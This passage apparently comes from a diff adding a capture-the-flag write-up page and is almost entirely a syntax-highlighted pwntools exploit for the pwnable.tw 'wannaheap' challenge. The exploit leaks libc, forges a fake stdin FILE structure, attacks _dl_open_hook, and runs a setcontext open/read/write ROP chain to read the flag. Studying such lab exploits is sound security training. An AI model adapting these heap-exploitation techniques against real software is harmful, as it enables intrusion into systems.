+<span class="n">_open</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;open&#34;</span><span class="p">]</span>
+<span class="n">_read</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]</span>
+<span class="n">_write</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">]</span>
+
+<span class="n">s</span><span class="p">(</span><span class="n">p16</span><span class="p">(((</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0x400</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)))</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;gadget&#34;</span><span class="p">,</span><span class="n">gadget</span><span class="p">)</span>
+<span class="c1">#3.1 stdin fifo</span>
+<span class="n">fake_stdin</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0x341</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_stdfile_0_lock</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_file_jumps</span><span class="p">)</span>
+<span class="c1">#3.2 fake chunk &amp; ROP</span>
+<span class="n">fake_chunk</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">dl_open_hook</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x621</span><span class="p">)</span>
+<span class="n">ORW</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_open</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_read</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_write</span><span class="p">)</span>
+<span class="n">fake_wide</span><span class="o">=</span><span class="p">(</span><span class="n">fake_chunk</span><span class="o">+</span><span class="n">ORW</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x140</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0x140 bytes</span>
+<span class="c1">#3.3 hook</span>
+<span class="n">four_hook</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">#0x20 bytes</span>
+<span class="c1">#3.4 main_arena data</span>
+<span class="n">main_arena</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x100000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span>\
+<span class="n">p64</span><span class="p">(</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">53</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_main_arena</span><span class="o">+</span><span class="mi">104</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+<span class="n">main_arena</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">_main_arena</span><span class="o">+</span><span class="mi">120</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">main_arena</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0xf0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">fake_stdin</span><span class="o">+</span><span class="n">fake_wide</span><span class="o">+</span><span class="n">four_hook</span><span class="o">+</span><span class="n">main_arena</span>
+<span class="c1">#3.5 unsorted bin attack &amp; call dl_open_mode</span>
+<span class="n">s</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="epitome">Epitome</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">s</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sea</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>          <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+<span class="n">info_addr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>        <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span><span class="s1">&#39;: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span><span class="mi">10305</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./wannaheap&#34;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">command</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-v&#39;</span><span class="p">]</span>
+	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+	<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/glibc/2.24/64/lib/libc-2.24.so&#34;</span><span class="p">)</span>
+	<span class="c1">#libc=ELF(&#34;./libc-2.24.so&#34;)</span>
+	<span class="n">debug</span><span class="p">(</span><span class="s2">&#34;b*0x7ffff7aa36aa</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>
+	<span class="c1">#1.modify stdin buffer</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size :&#34;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x6998e8</span><span class="p">))</span> <span class="c1">#local</span>
+	<span class="c1">#sl(str(0x6c28e8))</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size :&#34;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x300000</span><span class="p">))</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Content :&#34;</span><span class="p">)</span>
+	<span class="n">sl</span><span class="p">(</span><span class="s2">&#34;./flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+
+
+	<span class="c1">#2.leak libc</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key :&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x22</span><span class="s2">&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;data :&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key :&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x12</span><span class="s2">&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;data :&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="s2">&#34;R&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;key:&#34;</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x12</span><span class="s2">&#34;</span><span class="p">)</span>
+	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+
+	<span class="n">libc_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_IO_file_jumps&#34;</span><span class="p">]</span>
+	<span class="c1">#libc_base=u64(ru(&#34;\n&#34;).ljust(8,b&#34;\x00&#34;))-97-libc.symbols[&#34;_IO_2_1_stdout_&#34;]</span>
+	<span class="n">IO_stdin</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_IO_2_1_stdin_&#34;</span><span class="p">]</span><span class="o">+</span><span class="mh">0x40</span>
+
+	<span class="n">io_stdfile_0_lock</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_IO_stdfile_0_lock&#34;</span><span class="p">]</span>
+	<span class="c1">#io_stdfile_0_lock=libc_base+0x3c3770</span>
+	
+	<span class="n">io_file_jumps</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_IO_file_jumps&#34;</span><span class="p">]</span>
+	<span class="n">dl_open_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;_dl_open_hook&#34;</span><span class="p">]</span>
+	<span class="n">setcontext</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;setcontext&#34;</span><span class="p">]</span>
+	<span class="n">_main_arena</span><span class="o">=</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0x200</span>
+	<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+
+	<span class="c1"># 3.unsortd bin attack dl_open_hook</span>
+	<span class="c1"># 	local</span>
+	<span class="n">gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000676aa</span>
+	<span class="n">heap</span><span class="o">=</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x301000</span>
+	<span class="n">ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc1c</span>
+	<span class="n">rdi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc6a</span>
+	<span class="n">rsi_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000001fc1b</span>
+	<span class="n">rdx_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000001b92</span>
+	<span class="c1"># 	remote</span>
+	<span class="c1"># gadget=libc_base+0x000000000006ebbb</span>
+	<span class="c1"># heap=libc_base-0x301000</span>
+	<span class="c1"># ret=libc_base+0x00000000000937</span>
+	<span class="c1"># rdi_ret=libc_base+0x000000000001fd7a</span>
+	<span class="c1"># rsi_ret=libc_base+0x000000000001fcbd</span>
+	<span class="c1"># rdx_ret=libc_base+0x0000000000001b92</span>
+	<span class="n">_open</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;open&#34;</span><span class="p">]</span>
+	<span class="n">_read</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]</span>
+	<span class="n">_write</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">]</span>
+
+	<span class="n">s</span><span class="p">(</span><span class="n">p16</span><span class="p">(((</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0x400</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)))</span>
+	<span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+	<span class="n">info_addr</span><span class="p">(</span><span class="s2">&#34;gadget&#34;</span><span class="p">,</span><span class="n">gadget</span><span class="p">)</span>
+		<span class="c1">#3.1 stdin fifo</span>
+	<span class="n">fake_stdin</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin</span><span class="o">+</span><span class="mh">0x341</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_stdfile_0_lock</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span>\
